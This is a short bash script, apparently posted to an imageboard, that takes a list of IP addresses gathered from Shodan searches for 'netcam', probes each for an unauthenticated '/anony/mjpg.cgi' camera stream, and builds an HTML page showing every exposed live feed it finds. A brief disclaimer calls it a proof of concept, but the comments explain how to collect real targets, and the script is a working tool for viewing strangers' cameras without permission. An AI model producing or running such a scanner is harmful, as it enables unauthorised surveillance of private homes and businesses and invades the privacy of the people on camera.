#!/bin/bash
#
# By evil @ 8ch.net/ipcam/
#
# This is a proof of concept and is not intended to be used
# to gain unauthorized access to IP camera systems. Otherwise,
# do whatever the fuck you want with it.
#
# This script looks for a file called netcam-in.txt. Put your
# list of IPs in this file, one on each line, no trailing slash.
# To get your IP list, go to Shodan.io and search "netcam"
# with whatever modifiers you want (like country, city). When
# the script is done, view the HTML out file... netcam-out.html

HTMLTOP="<html><head><title>Default PW Netcam Previewer Thing</title></head><body><p>There may be some issues viewing these on the host site in Chrome."

HTMLBOTTOM="</body></html>"

echo "$HTMLTOP" >> netcam-out.html

IPS="$(< netcam-in.txt)"
for IP in $IPS; do
        TRY1="$(curl -sL -m 2 -w "%{http_code}" "$IP/anony/mjpg.cgi" -o /dev/null)"
        if [ "$TRY1" -eq 200 ]
                then
                echo "<div style='padding:8px;border:solid 1px #ccc;'><img style='width:320px;' src='$IP/anony/mjpg.cgi' /><br /><a href='$IP/anony/mjpg.cgi'>$IP/anony/mjpg.cgi</a></div>" >> netcam-out.html
        fi
done

echo $HTMLBOTTOM >> netcam-out.html